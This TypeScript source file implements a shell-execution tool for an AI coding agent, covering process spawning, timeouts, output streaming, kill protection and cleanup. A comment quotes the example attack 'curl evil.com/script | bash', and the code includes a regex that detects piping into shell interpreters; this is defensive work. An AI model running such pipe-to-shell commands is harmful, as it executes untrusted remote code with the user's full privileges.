import { spawn } from 'node:child_process';
import * as os from 'node:os';
import { StringDecoder } from 'node:string_decoder';
import type { Context } from '@wrongstack/core/agent';
import {
  emitProcessCompleted,
  emitProcessOutput,
  emitProcessStarted,
} from '@wrongstack/core/observability';
import type { Tool, ToolStreamEvent } from '@wrongstack/core/types';
import { ToolValidationError } from '@wrongstack/core/types';
import { buildChildEnv } from './_env.js';
import { createOutputSpool, spoolNote } from './_output-spool.js';
import {
  type BashShell,
  diagnoseBashism,
  pickShell,
  shellArgs,
  wrapPowerShellScript,
} from './_shell-pick.js';
import { normalizeCommandOutput } from './_util.js';
import { resolvePowerShell } from './_win32-resolve.js';
import { checkAndBlockKillCommand } from './bash-kill-guard.js';
import { getProcessRegistry, redactCommand } from './process-registry.js';

interface BashInput {
  command: string;
  timeout_ms?: number | undefined;
  background?: boolean | undefined;
}

interface BashOutput {
  output: string;
  exit_code: number | null;
  timed_out: boolean;
  pid?: number | null | undefined;
  error?: string | undefined;
}

const MAX_OUTPUT = 32_768;
// 32 KB — keeps context manageable for arbitrary commands. bash output
// is typically unbounded LLM tool-use context; larger caps risk pushing
// the context window to compaction on every invocation.

// 5 minutes — generous enough for most real-world commands (npm install,
// docker build, etc.) without letting a hung process consume the session.
// The per-call timeout_ms parameter still allows precise overrides.
// The circuit breaker's slow-call threshold (180s) sits below this so
// commands that run >3min still count as "slow" and can trip the breaker
// after 3 occurrences.
const DEFAULT_TIMEOUT_MS = 300_000;

// Flush partial_output every 200ms or when 4 KiB accumulates — whichever
// comes first. Smaller batches make the TUI feel responsive; larger ones
// keep EventBus traffic reasonable on chatty processes.
const STREAM_FLUSH_INTERVAL_MS = 200;
const STREAM_FLUSH_BYTES = 4 * 1024;

// Maximum chunks buffered between the child's data handlers and the
// streaming consumer before the pipes are paused (backpressure). Without
// this, a consumer that stalls — or a generator that was torn down while a
// (grand)child keeps writing — lets `queue`/`pending` grow without bound
// and can OOM the host process.
const MAX_QUEUE_CHUNKS = 500;

export const bashTool: Tool<BashInput, BashOutput> = {
  name: 'bash',
  category: 'Shell',
  description:
    "Execute an arbitrary command in the user's default shell (bash/zsh/pwsh/cmd). " +
    'stdout and stderr are merged into one stream. This is the most powerful and dangerous tool — ' +
    "it gives the model full access to the developer's machine. Prefer specialized tools whenever possible.",
  usageHint:
    'SECURITY WARNING: This tool runs with the full privileges of the current user.\n\n' +
    'Best practices for the model:\n' +
    '- Strongly prefer `exec` for known safe commands (node, npm, pnpm, tsc, git, etc.).\n' +
    '- Use bash only when you genuinely need shell features (pipes, redirection, complex one-liners).\n' +
    '- Prefer single focused commands over huge `&&` chains.\n' +
    '- Use `background: true` only for long-running processes (dev servers, watchers).\n' +
    '- The working directory is the session working dir (changed via `set_working_dir`), defaulting to the project root.\n' +
    '- Output may be truncated in the middle for very large results.',
  selection: {
    doNotUseWhen:
      'the command is allowlisted and does not require pipes, redirection, or shell expansion.',
    useInstead: ['exec'],
  },
  permission: 'confirm',
  mutating: true,
  riskTier: 'destructive',
  icon: 'terminal',
  // Trust rules match on the literal `command` string. Without subjectKey
  // the policy heuristic would have done the same here, but declaring it
  // explicitly removes the implicit cross-tool aliasing.
  subjectKey: 'command',
  capabilities: ['shell.arbitrary'],
  // Executor-level abort ceiling. Must sit ABOVE the per-call `timeout_ms`
  // ceiling (600_000): the tool's own timer tree-kills and returns a
  // structured `timed_out: true` result, while the executor's
  // AbortSignal.timeout is a blunt abort. The old value (300_000) meant any
  // timeout_ms > 5min was silently cut short by the executor. The 10s margin
  // covers the kill/teardown window. (The executor additionally clamps to
  // config `tools.maxToolTimeoutMs`.)
  timeoutMs: 610_000,
  maxOutputBytes: MAX_OUTPUT,
  estimatedDurationMs: 30_000,
  inputSchema: {
    type: 'object',
    properties: {
      command: {
        type: 'string',
        description: 'The exact shell command to run. Prefer simple, focused commands.',
      },
      timeout_ms: {
        type: 'integer',
        description:
          'Optional timeout for this specific command in milliseconds (default 300000, max 600000).',
      },
      background: {
        type: 'boolean',
        description:
          'If true, launch the process in the background and return the PID immediately.',
      },
    },
    required: ['command'],
  },
  async execute(input, ctx, opts) {
    let final: BashOutput | undefined;
    const executeStream = bashTool.executeStream;
    if (!executeStream) throw new Error('bashTool: stream execution unavailable');
    for await (const ev of executeStream(input, ctx, opts)) {
      if (ev.type === 'final') final = ev.output;
    }
    if (!final) throw new Error('bash: stream ended without final event');
    return final;
  },
  async *executeStream(input, ctx, opts): AsyncGenerator<ToolStreamEvent<BashOutput>> {
    if (!input?.command || typeof input.command !== 'string' || !input.command.trim()) {
      throw new ToolValidationError({
        message: 'bash: command is required and cannot be empty',
        field: 'command',
      });
    }

    const registry = getProcessRegistry();
    // Background processes bypass the circuit breaker — they are fire-and-forget
    // and should not affect breaker state. This allows background vitest, dev
    // servers, etc. to run even when the breaker is open.
    const bypassBreaker = !!input.background;
    if (!registry.beforeCall(bypassBreaker)) {
      yield {
        type: 'final',
        output: {
          output: '',
          exit_code: 1,
          timed_out: false,
          pid: null,
          error:
            'bash: circuit breaker open — too many consecutive failures or slow calls. Use /kill to inspect or /kill reset to recover.',
        },
      };
      return;
    }

    // Kill protection: block commands that try to kill protected WrongStack processes
    // This includes direct kill commands, bash -c wrapped kills, and name-based kills (pkill, killall)
    const killCheck = await checkAndBlockKillCommand(input.command);
    if (killCheck.blocked) {
      yield {
        type: 'final',
        output: {
          output: '',
          exit_code: 1,
          timed_out: false,
          pid: null,
          error:
            killCheck.reason || 'Kill command blocked: targets a protected WrongStack process.',
        },
      };
      return;
    }

    // Security: detect pipe-to-shell patterns that could lead to arbitrary
    // code execution (e.g., "curl evil.com/script | bash"). This pattern is
    // particularly dangerous because the user confirms a seemingly innocuous
    // command but the downloaded script executes arbitrary code. Advisory
    // only — the note is appended to the TOOL RESULT so the model and the
    // user actually see it. (A console.warn here used to corrupt the TUI's
    // stdout frame instead of reaching anyone.)
    const PIPE_TO_SHELL_PATTERN = /\|\s*(sh|bash|ksh|zsh|fish|cmd|powershell|pwsh)/i;
    const pipeToShellNote = PIPE_TO_SHELL_PATTERN.test(input.command)
      ? '\n\n[wrongstack] Caution: this command pipes output into a shell interpreter ' +
        '(pipe-to-shell). Piped content executes as arbitrary code — review the source ' +
        'before trusting the result, and prefer downloading to a file and inspecting it first.'
      : '';

    const rawTimeout =
      typeof input.timeout_ms === 'number' && !Number.isNaN(input.timeout_ms)
        ? input.timeout_ms
        : DEFAULT_TIMEOUT_MS;
    const timeoutMs = Math.max(1, Math.min(rawTimeout, 600_000));

    const isWin = os.platform() === 'win32';
    // Shell selection:
    //   - POSIX: existing behavior — `WRONGSTACK_SHELL` override, else `$SHELL`
    //     if it names an allowlisted shell, else `/bin/bash`. cmd.exe-style
    //     semantics don't apply on POSIX.
    //   - Windows: delegate to `pickShell`, which honours `WRONGSTACK_SHELL`
    //     (when set to cmd|powershell|pwsh), auto-detects PowerShell-style
    //     commands (so Codex-style `Get-Content`/`Set-Location`/etc. work
    //     without forcing every user to set an env var), and falls back to
    //     `cmd.exe` for legacy scripts. The `BashShell` sentinel is then
    //     mapped to the actual binary path below.
    //
    // The user-controllable `SHELL` and `COMSPEC` env vars are NOT trusted
    // — a user (or another agent) could point them at an arbitrary binary on
    // shared systems. Only `WRONGSTACK_SHELL` (and the hard-coded defaults
    // in `_shell-pick.ts` / this block) are honoured.
    type ShellPlan = {
      /** Binary path passed to spawn(). */
      bin: string;
      /** argv prefix (everything except the inline command). */
      argv: readonly string[];
      /** Command payload appended to argv. PowerShell requires UTF-16LE Base64. */
      commandArg: string;
    };
    let plan: ShellPlan;
    // The resolved Windows shell kind, kept in scope so the post-failure
    // bash-ism diagnosis below can speak the right shell's syntax. undefined on
    // POSIX (no diagnosis there — bash idioms are correct).
    let winShellKind: BashShell | undefined;
    if (isWin) {
      const shell: BashShell = pickShell('win32', input.command, {
        get: (k) => process.env[k],
      });
      winShellKind = shell;
      // Resolve a sensible default binary. `pickShell` decided the shell
      // kind, but the actual spawn uses a real path:
      //   - 'cmd'         → COMSPEC or `cmd.exe`. The user can override
      //                    via WRONGSTACK_SHELL=cmd (already handled by
      //                    pickShell).
      //   - 'powershell'  → `powershell.exe` (Windows PS 5.1).
      //   - 'pwsh'        → `pwsh.exe` (PS 7+) if installed, else fall
      //                    back to `powershell.exe`. We don't probe the
      //                    filesystem here; _win32-resolve.ts does the
      //                    PATHEXT walk at spawn time and surfaces ENOENT
      //                    cleanly if PowerShell is not installed.
      // `resolvePowerShell` walks PATH/PATHEXT to find the binary (PS 7 is
      // not always on PATH; legacy PS 5.1 is in System32). For 'cmd' we let
      // Node's own PATH search handle COMSPEC — `cmd.exe` is always on
      // System32 which is in PATH by default.
      const bin =
        shell === 'powershell'
          ? resolvePowerShell('powershell.exe')
          : shell === 'pwsh'
            ? resolvePowerShell('pwsh.exe')
            : (process.env['COMSPEC'] ?? 'cmd.exe');
      plan = {
        bin,
        argv: shellArgs(shell),
        commandArg:
          shell === 'powershell' || shell === 'pwsh'
            ? Buffer.from(wrapPowerShellScript(input.command), 'utf16le').toString('base64')
            : input.command,
      };
    } else {
      // POSIX: use WRONGSTACK_SHELL if set; else honor $SHELL only when it
      // names an allowlisted shell (bash/zsh/sh/dash/fish); else /bin/bash.
      const explicit = process.env['WRONGSTACK_SHELL'];
      let bin: string;
      if (explicit) bin = explicit;
      else {
        const fromEnv = process.env['SHELL'];
        if (fromEnv) {
          const name = fromEnv.split('/').pop() ?? '';
          if (['bash', 'zsh', 'sh', 'dash', 'fish'].includes(name)) bin = fromEnv;
          else bin = '/bin/bash';
        } else bin = '/bin/bash';
      }
      plan = { bin, argv: ['-c'], commandArg: input.command };
    }
    const shell = plan.bin;
    const args = [...plan.argv, plan.commandArg];

    const env = buildChildEnv(ctx.session?.id);

    // Spawn in the SESSION working dir (set via `set_working_dir`; containment
    // against projectRoot is enforced by Context.setWorkingDir), falling back
    // to the project root. Historically this was hard-wired to projectRoot,
    // which made `set_working_dir` silently ineffective for shell tools.
    const spawnCwd = ctx.workingDir ?? ctx.projectRoot;
    const callerSignal = opts?.signal ?? ctx.signal ?? new AbortController().signal;
    if (callerSignal.aborted) {
      yield {
        type: 'final',
        output: {
          output: 'Aborted',
          exit_code: 124,
          timed_out: true,
          pid: null,
        },
      };
      return;
    }

    // On POSIX we put the shell in its own process group so that timeout /
    // abort can kill the entire group with `process.kill(-pid)`. Otherwise
    // `bash -c "sleep 9999 & disown"` would leave the grandchild running.
    // Never on Windows: timeouts tree-kill via taskkill /T instead, and
    // DETACHED_PROCESS would void windowsHide (grandchildren would pop
    // visible console windows — see the background-mode spawn below).
    const detached = !isWin;

    const startedAt = Date.now();

    if (input.background) {
      // Background mode is fully detached from the host's output pipes. If
      // stdout/stderr stayed piped, closing the CLI would close the read ends
      // and a later write could terminate the preserved job with EPIPE/SIGPIPE.
      const child = spawn(shell, args, {
        cwd: spawnCwd,
        env,
        stdio: ['ignore', 'ignore', 'ignore'],
        detached: !isWin,
        windowsHide: true,
      });
      const pid = child.pid;
      const stdoutBytes = 0;
      const stderrBytes = 0;
      let telemetryCompleted = false;
      emitProcessStarted({
        ...(pid !== undefined ? { pid } : {}),
        parentPid: process.pid,
        command: redactCommand(`${shell} ${args.join(' ')}`),
        args: redactCommand(args.join(' ')).split(' ').filter(Boolean),
        cwd: spawnCwd,
        background: true,
        startedAt: new Date(startedAt).toISOString(),
      });
      const completeBackground = (exitCode: number, signal?: string | undefined) => {
        if (telemetryCompleted) return;
        telemetryCompleted = true;
        emitProcessCompleted({
          ...(pid !== undefined ? { pid } : {}),
          exitCode,
          ...(signal ? { signal } : {}),
          durationMs: Date.now() - startedAt,
          stdoutBytes,
          stderrBytes,
          timedOut: false,
          endedAt: new Date().toISOString(),
        });
      };
      if (typeof pid === 'number') {
        registry.register({
          pid,
          name: 'bash',
          command: redactCommand(input.command),
          startedAt: Date.now(),
          sessionId: ctx.session?.id,
          child,
          processGroupLeader: detached && child.pid === pid,
          background: true,
        });
        // Register the close handler on the same tick as spawn() so the
        // handler is guaranteed to be in place before Node's event loop
        // can deliver the close event.
        child.on('close', () => registry.unregister(pid));
      }
      child.on('error', () => {
        if (typeof pid === 'number') registry.unregister(pid);
        registry.afterCall(Date.now() - startedAt, true, bypassBreaker);
        completeBackground(1);
      });
      // The pipe handles would otherwise keep the parent's event loop alive
      // for as long as the background process runs — child.unref() alone
      // does not release stdio. A one-shot (--print) run could never exit
      // while a background dev server kept its pipes open.
      child.on('close', (code, signal) => {
        registry.afterCall(Date.now() - startedAt, false, bypassBreaker);
        completeBackground(code ?? (signal ? 1 : 0), signal ?? undefined);
      });
      if (typeof pid === 'number') child.unref(); // unref() so the event loop can exit while this background process runs.
      yield {
        type: 'final',
        output: {
          // Background runs have no captured output; the pipe-to-shell caution
          // (when present) is the only thing worth surfacing.
          output: pipeToShellNote.trim(),
          exit_code: null,
          timed_out: false,
          pid,
        },
      };
      // P2 #5: record the background launch as a structured side effect.
      ctx.recordSideEffect?.({
        toolUseId: `bash-bg-${Date.now()}`,
        toolName: 'bash',
        ts: new Date().toISOString(),
        input: { command: redactCommand(input.command), background: true },
        outcome: `launched (pid ${pid ?? 'unknown'})`,
        risk: 'shell',
      });
      return;
    }

    // Foreground mode: pipe stdout/stderr for streaming output.
    // On Windows the abort signal is handled manually below instead of being
    // passed to spawn(): Node's built-in handling kills only the direct
    // child (cmd.exe), which destroys taskkill's parent-pid tree enumeration
    // and orphans the actual command (node/vitest/dev server). The orphan
    // keeps the inherited stdio pipes open and streams into this process
    // for the rest of the session.
    const child = spawn(shell, args, {
      cwd: spawnCwd,
      env,
      stdio: ['ignore', 'pipe', 'pipe'],
      detached,
      windowsHide: true,
      ...(isWin ? {} : { signal: callerSignal }),
    });

    // Register with global registry so Ctrl+C / /kill can find and kill it.
    const pid = child.pid;
    let stdoutBytes = 0;
    let stderrBytes = 0;
    let telemetryCompleted = false;
    emitProcessStarted({
      ...(pid !== undefined ? { pid } : {}),
      parentPid: process.pid,
      command: redactCommand(`${shell} ${args.join(' ')}`),
      args: redactCommand(args.join(' ')).split(' ').filter(Boolean),
      cwd: spawnCwd,
      background: false,
      startedAt: new Date(startedAt).toISOString(),
    });
    const completeForeground = (exitCode: number, signal?: string | undefined) => {
      if (telemetryCompleted) return;
      telemetryCompleted = true;
      emitProcessCompleted({
        ...(pid !== undefined ? { pid } : {}),
        exitCode,
        ...(signal ? { signal } : {}),
        durationMs: Date.now() - startedAt,
        stdoutBytes,
        stderrBytes,
        timedOut,
        endedAt: new Date().toISOString(),
      });
    };
    if (typeof pid === 'number') {
      registry.register({
        pid,
        name: 'bash',
        command: redactCommand(input.command),
        startedAt: Date.now(),
        sessionId: ctx.session?.id,
        child,
        processGroupLeader: detached && child.pid === pid,
      });
    }

    let buf = '';
    let pending = '';
    let timedOut = false;
    const timers: NodeJS.Timeout[] = [];
    // Full-output spool: `buf` keeps only the first MAX_OUTPUT bytes for the
    // model; everything else used to be dropped. The spool streams the FULL
    // output to a file once it exceeds the cap, and the final result carries
    // a marker pointing at it — file-based instead of in-memory/in-context.
    const spool = createOutputSpool({ tool: 'bash', thresholdBytes: MAX_OUTPUT });

    function killWithTimeout(child: ReturnType<typeof spawn>, timeoutMs: number): void {
      if (isWin) {
        // Let the registry handle Windows tree-kill and its fallback timing.
        // A direct child.kill() before taskkill settles can orphan the real
        // command and leave inherited stdio pipes open.
        if (typeof child.pid === 'number' && child.exitCode === null) {
          const attempted = registry.kill(child.pid, { force: true, graceMs: timeoutMs });
          if (!attempted) {
            try {
              child.kill();
            } catch {
              /* ignore */
            }
          }
        } else {
          try {
            child.kill();
          } catch {
            /* ignore */
          }
        }
        return;
      }

      if (typeof child.pid === 'number') {
        registry.kill(child.pid, { graceMs: timeoutMs });
      } else {
        try {
          child.kill('SIGTERM');
        } catch {
          /* ignore */
        }
        const killTimer = setTimeout(() => {
          try {
            child.kill('SIGKILL');
          } catch {
            /* ignore */
          }
        }, timeoutMs);
        timers.push(killTimer);
        killTimer.unref?.();
      }
    }

    const timer = setTimeout(() => {
      timedOut = true;
      killWithTimeout(child, 2000);
    }, timeoutMs);
    timers.push(timer);
    timer.unref?.();

    // Windows abort handling (see the spawn() comment above): tree-kill on
    // abort while the shell is still alive so its grandchildren die with it.
    const onAbort = () => killWithTimeout(child, 2000);
    if (isWin) {
      if (callerSignal.aborted) onAbort();
      else callerSignal.addEventListener('abort', onAbort, { once: true });
    }

    // Bridge the EventEmitter-style child to an async iterator.
    type Chunk =
      | { kind: 'data'; text: string }
      | { kind: 'end'; code: number | null }
      | { kind: 'error'; err: Error };
    const queue: Chunk[] = [];
    let resolveNext: ((c: Chunk) => void) | null = null;
    const push = (c: Chunk) => {
      if (resolveNext) {
        const r = resolveNext;
        resolveNext = null;
        r(c);
      } else {
        queue.push(c);
      }
    };
    const next = (): Promise<Chunk> =>
      new Promise((resolve) => {
        const c = queue.shift();
        if (c) resolve(c);
        else resolveNext = resolve;
      });

    let lastFlush = Date.now();
    const flush = () => {
      if (pending.length === 0) return null;
      const text = pending;
      pending = '';
      lastFlush = Date.now();
      return text;
    };

    // Backpressure: when the consumer falls behind, pause the pipes instead
    // of letting `queue`/`pending` grow without bound. The child eventually
    // blocks on write, which is the correct pressure signal.
    let paused = false;
    const pauseIfFlooded = () => {
      if (!paused && queue.length >= MAX_QUEUE_CHUNKS) {
        paused = true;
        child.stdout?.pause();
        child.stderr?.pause();
      }
    };
    const resumeIfDrained = () => {
      if (paused && queue.length < MAX_QUEUE_CHUNKS) {
        paused = false;
        child.stdout?.resume();
        child.stderr?.resume();
      }
    };
    // Per-stream UTF-8 decoders: `chunk.toString()` on raw chunks corrupts
    // multi-byte sequences that straddle a chunk boundary (each half decodes
    // to U+FFFD). StringDecoder buffers the trailing partial sequence and
    // prepends it to the next chunk — one decoder per stream, since stdout
    // and stderr chunks interleave arbitrarily.
    const stdoutDecoder = new StringDecoder('utf8');
    const stderrDecoder = new StringDecoder('utf8');
    const onData = (chunk: Buffer, stream: 'stdout' | 'stderr') => {
      const text = (stream === 'stdout' ? stdoutDecoder : stderrDecoder).write(chunk);
      if (stream === 'stdout') stdoutBytes += chunk.byteLength;
      else stderrBytes += chunk.byteLength;
      emitProcessOutput({ pid, stream, chunk });
      if (text.length > 0) {
        if (buf.length < MAX_OUTPUT) {
          buf += text.slice(0, MAX_OUTPUT - buf.length);
        }
        spool.write(text);
        pending += text;
        push({ kind: 'data', text });
        pauseIfFlooded();
      }
    };
    const onStdoutData = (chunk: Buffer) => onData(chunk, 'stdout');
    const onStderrData = (chunk: Buffer) => onData(chunk, 'stderr');
    child.stdout?.on('data', onStdoutData);
    child.stderr?.on('data', onStderrData);

    child.on('error', (err) => {
      for (const t of timers) clearTimeout(t);
      registry.afterCall(Date.now() - startedAt, true);
      completeForeground(1);
      push({ kind: 'error', err });
    });
    child.on('close', (code, signal) => {
      for (const t of timers) clearTimeout(t);
      if (typeof pid === 'number') registry.unregister(pid);
      registry.afterCall(Date.now() - startedAt, code !== 0 && code !== null);
      completeForeground(timedOut ? 124 : (code ?? (signal ? 1 : 0)), signal ?? undefined);
      // Flush any buffered partial UTF-8 sequence held by the decoders so a
      // trailing incomplete character surfaces (as U+FFFD) instead of being
      // silently dropped.
      const tail = stdoutDecoder.end() + stderrDecoder.end();
      if (tail) {
        if (buf.length < MAX_OUTPUT) buf += tail.slice(0, MAX_OUTPUT - buf.length);
        spool.write(tail);
        pending += tail;
      }
      push({ kind: 'end', code });
    });

    try {
      while (true) {
        const c = await next();
        resumeIfDrained();
        if (c.kind === 'error') throw c.err;
        if (c.kind === 'end') {
          const remainder = flush();
          if (remainder !== null) {
            yield { type: 'partial_output', text: remainder };
          }
          const spooled = spool.finalize();
          // Advisory bash-ism guard: on a genuine non-zero exit (not a
          // timeout), if the command used POSIX syntax the resolved Windows
          // shell can't accept, append a targeted hint so the model rewrites it
          // next turn. Never mutates/blocks; silent on success and on POSIX.
          const hint =
            !timedOut && typeof c.code === 'number' && c.code !== 0 && winShellKind
              ? diagnoseBashism(input.command, winShellKind)
              : undefined;
          const isAborted = callerSignal.aborted;
          yield {
            type: 'final',
            output: {
              output:
                normalizeCommandOutput(buf) +
                (spooled ? spoolNote(spooled) : '') +
                (hint ? `\n\n${hint}` : '') +
                pipeToShellNote,
              exit_code: timedOut || isAborted ? 124 : c.code,
              timed_out: timedOut || isAborted,
              pid: pid ?? null,
              error: isAborted ? 'Command aborted by user or signal' : undefined,
            },
          };
          // P2 #5: record the command execution as a structured side effect.
          ctx.recordSideEffect?.({
            toolUseId: `bash-${Date.now()}`,
            toolName: 'bash',
            ts: new Date().toISOString(),
            input: { command: redactCommand(input.command) },
            outcome: timedOut ? `timed out (exit ${c.code})` : `exit ${c.code}`,
            risk: 'shell',
          });
          return;
        }
        const now = Date.now();
        if (pending.length >= STREAM_FLUSH_BYTES || now - lastFlush >= STREAM_FLUSH_INTERVAL_MS) {
          const text = flush();
          if (text) yield { type: 'partial_output', text };
        }
      }
    } finally {
      for (const t of timers) clearTimeout(t);
      spool.finalize(); // idempotent — closes the file if the stream was abandoned
      if (isWin) callerSignal.removeEventListener('abort', onAbort);
      // Teardown: this generator can be abandoned mid-stream (executor
      // timeout, abort, consumer error). The data handlers above would
      // otherwise stay attached and keep appending to `pending`/`queue`
      // with no consumer — on Windows a shell grandchild that survived
      // child.kill() can feed the orphaned pipes for the rest of the
      // session, growing the host heap until OOM. Detach the handlers,
      // destroy the pipes, and make sure nothing is still running.
      child.stdout?.off('data', onStdoutData);
      child.stderr?.off('data', onStderrData);
      child.stdout?.destroy();
      child.stderr?.destroy();
      if (child.exitCode === null && !child.killed) {
        if (typeof pid === 'number') registry.kill(pid, { force: true });
        else killWithTimeout(child, 2000);
      }
    }
  },

  /**
   * Tool-level teardown fired by `ToolExecutor.runToolCleanup()` when the
   * tool's run is aborted/timeout'd. The generator's `finally` block above
   * already force-kills the direct child, but that only runs if the
   * executor closes the async iterator (via `iter.return()`). When the
   * executor tears down without iterating — or a re-entrant abort races
   * with the generator — a bash-spawned process tree can survive in the
   * ProcessRegistry with `killed === false`, continuing to write files,
   * consume CPU, or hold inherited stdio pipes open for the rest of the
   * session.
   *
   * This is the defensive layer the executor calls via `tool.cleanup()`
   * (see `types/tool.ts`): kill every bash-owned process still tracked
   * for this session that hasn't exited yet. `registry.kill()` already
   * handles process-group / taskkill tree-kill and the SIGTERM→SIGKILL
   * grace window, so this just scopes the registry's existing kill path
   * to "this session's runaway bash children". Idempotent — a process
   * that already exited is skipped by `kill()` (it returns false), and a
   * `protected` infrastructure process (dev server the user intentionally
   * backgrounded) is left alone by design.
   */
  async cleanup(_input: BashInput, ctx: Context): Promise<void> {
    const registry = getProcessRegistry();
    const sessionId = ctx.session?.id;
    if (!sessionId) return;
    for (const entry of registry.bySession(sessionId)) {
      if (entry.name !== 'bash') continue; // leave exec-spawned children alone
      if (entry.child && entry.child.exitCode !== null) continue; // already reaped
      if (entry.background) continue; // detached jobs intentionally outlive the run/session
      if (entry.protected) continue; // intentionally-backgrounded infra
      registry.kill(entry.pid, { force: true });
    }
  },
};

// Re-export types so consumers can narrow on stream events.
export type { BashInput, BashOutput };
